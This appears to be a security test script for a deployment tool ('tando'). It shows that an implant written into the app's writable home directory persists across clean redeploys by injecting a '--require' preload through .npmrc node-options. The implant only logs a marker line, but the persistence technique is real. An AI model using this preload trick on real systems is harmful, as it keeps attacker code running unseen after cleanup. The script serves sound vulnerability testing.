#!/bin/bash
# sec3 S2: an implant in the app-writable HOME (shared/) survives a clean redeploy and rollback.
# Run from an app directory whose tando.conf has `start = npm start` and whose current release is
# compromised (here: any way to run a command as the app user; tando ssh stands in for it).
set -u; : "${R:?path to bin/tando}"
"$R" ssh -- 'echo "require(\"fs\").appendFileSync(process.env.HOME+\"/implant.log\", process.argv[1]+\"\\n\")" > $HOME/implant.js && echo "node-options=--require $HOME/implant.js" > $HOME/.npmrc' < /dev/null
echo "now deploy a clean release (tando up), then:"; echo "  tando ssh -- cat \$HOME/implant.log   # lines from the new release = implant ran"
